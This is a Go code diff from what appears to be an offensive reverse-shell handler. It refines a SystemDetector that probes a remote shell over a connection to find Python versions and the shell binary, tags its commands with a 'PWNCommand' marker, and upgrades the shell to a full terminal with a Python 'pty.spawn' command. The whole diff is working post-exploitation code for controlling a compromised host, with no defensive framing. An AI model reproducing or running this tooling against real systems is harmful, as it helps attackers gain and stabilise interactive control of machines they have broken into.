@@ -107,10 +107,12 @@ func (sd *SystemDetector) DetectPythonVersions() []string {
 					// Clean up the response to get just the version
 					version := strings.TrimSpace(line)
 					splitVersion := strings.Split(version, " ")
-					if len(splitVersion) > 1 {
+					if len(splitVersion) > 2 {
 						version = splitVersion[2]
-					} else {
+					} else if len(splitVersion) > 1 {
 						version = splitVersion[1]
+					} else {
+						continue
 					}
 					// Check if the version really a version (at least have 2 dots)
 					if strings.Count(version, ".") < 2 {
@@ -139,14 +141,32 @@ func (sd *SystemDetector) DetectShell() string {
 	}
 
 	for _, cmd := range shellChecks {
-		if _, err := sd.conn.Write([]byte(cmd + "\n")); err == nil {
+		// Read until we find our marker or timeout
+
+		if _, err := sd.conn.Write([]byte(cmd + " ; echo '" + PWNCommand + "'\n")); err == nil {
 			sd.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+			var fullResponse strings.Builder
 			buf := make([]byte, 1024)
-			n, err := sd.conn.Read(buf)
-			if err == nil {
-				response := strings.TrimSpace(string(buf[:n]))
-				if response != "" {
-					return response
+			for {
+				n, err := sd.conn.Read(buf)
+				if err != nil {
+					break
+				}
+				fullResponse.Write(buf[:n])
+				if strings.Contains(fullResponse.String(), PWNCommand) {
+					break
+				}
+			}
+			response := fullResponse.String()
+			if response != "" {
+				splitResponse := strings.Split(response, "\n")
+				shellCheck := strings.Split(cmd, " ")[1]
+				for _, line := range splitResponse {
+					line = strings.TrimSpace(line)
+					if line == shellCheck {
+						fmt.Println("[+] Found shell:", line)
+						return line
+					}
 				}
 			}
 		}
@@ -168,7 +188,7 @@ func (sd *SystemDetector) SpawnPTY(pythonVersions []string, shell string) bool {
 		pythonCmd = "python2"
 	}
 
-	ptyCmd := fmt.Sprintf("%s -c 'import pty;pty.spawn(\"%s\");'", pythonCmd, shell)
+	ptyCmd := fmt.Sprintf("%s -c 'import pty;pty.spawn(\"%s\");' ; echo '%s'", pythonCmd, shell, PWNCommand)
 	fmt.Printf("[+] Attempting to spawn PTY using %s with %s\n", pythonCmd, shell)
 
 	if _, err := sd.conn.Write([]byte(ptyCmd + "\n")); err == nil {
